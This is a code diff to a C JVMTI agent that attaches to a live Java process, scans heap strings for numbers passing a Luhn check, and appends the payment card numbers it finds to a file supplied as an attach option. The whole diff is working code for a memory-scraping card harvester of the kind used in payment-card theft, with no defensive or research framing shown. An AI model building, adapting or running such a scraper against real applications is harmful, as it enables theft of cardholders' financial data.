@@ -39,7 +39,8 @@ jint JNICALL StringPrimitiveValueCallback(jlong class_tag,  jlong size,
                                           const jchar* value,
                                           jint value_length,
                                           void* user_data) {
-    char pan_buffer[17];
+    char pan_buffer[19]; // 16 + CR + LF + 0x0
+    FILE *fp;
                                           
     if (check_luhn(value, value_length)) {
         for (int i = 0; i < value_length; ++i) {
@@ -50,8 +51,14 @@ jint JNICALL StringPrimitiveValueCallback(jlong class_tag,  jlong size,
              */
             pan_buffer[i] = (char) value[i];
         }
-        pan_buffer[16] = 0;
-        puts(pan_buffer);
+        pan_buffer[16] = '\r';
+        pan_buffer[17] = '\n';
+        pan_buffer[18] = 0;
+        fp = user_data;
+        if (fputs(pan_buffer, fp) == EOF) {
+            fprintf(stderr, "Failed to write PAN\n");
+        }
+        /* puts(pan_buffer); */
     }
     return JVMTI_VISIT_OBJECTS;
 }
@@ -68,7 +75,7 @@ void relinquish_capabilities(jvmtiEnv* jvmti, jvmtiCapabilities* capabilities) {
     }
 }
 
-JNIEXPORT jint JNICALL Agent_OnAttach(JavaVM* vm, char *options, void *reserved) {
+jint grap_pans(JavaVM* vm, FILE *fp) {
     jvmtiEnv* jvmti;
     jvmtiCapabilities capabilities;
     JNIEnv* env;
@@ -111,7 +118,7 @@ JNIEXPORT jint JNICALL Agent_OnAttach(JavaVM* vm, char *options, void *reserved)
     memset(&callbacks, 0, sizeof(callbacks));
     callbacks.string_primitive_value_callback = StringPrimitiveValueCallback;
     
-    tiError = (*jvmti)->IterateThroughHeap(jvmti, 0, stringClass, &callbacks, (void*) NULL);
+    tiError = (*jvmti)->IterateThroughHeap(jvmti, 0, stringClass, &callbacks, (void*) fp);
     relinquish_capabilities(jvmti, &capabilities);
     if(tiError != JVMTI_ERROR_NONE) {
         fprintf(stderr,"IterateThroughHeap failed with error(%d)\n", tiError);
@@ -119,5 +126,25 @@ JNIEXPORT jint JNICALL Agent_OnAttach(JavaVM* vm, char *options, void *reserved)
     }
     
     return 0;
+}
+
+JNIEXPORT jint JNICALL Agent_OnAttach(JavaVM* vm, char *options, void *reserved) {
+    FILE *fp;
+    jint result;
+    char *filename;
+    
+    filename = options;
+    fp = fopen(filename, "a");
+    if (fp == NULL) {
+        fprintf(stderr,"Failed to open file %s\n", filename);
+        return -1;
+    }
+    
+    result = grap_pans(vm, fp);
+    if (fclose(fp) != 0) {
+        fprintf(stderr,"Failed to close file %s\n", filename);
+    }
+    
+    return result;
 }
 
